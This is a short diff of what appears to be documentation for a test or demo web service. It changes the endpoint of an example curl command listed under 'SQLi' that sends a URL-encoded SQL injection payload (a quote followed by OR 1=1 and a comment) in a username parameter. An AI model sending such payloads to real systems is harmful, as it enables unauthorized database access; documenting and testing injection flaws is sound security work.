@@ -13,5 +13,5 @@ $ curl -s "http://$HOST:$PORT/find" -H 'Content-Type: application/json' -d '{"id
 ```
 SQLi
 ```
-$ curl -s "http://$HOST:$PORT/get?username=%22%20OR%201%3D1%3B%20--%20" | jq
+$ curl -s "http://$HOST:$PORT/select?username=%22%20OR%201%3D1%3B%20--%20" | jq
 ```
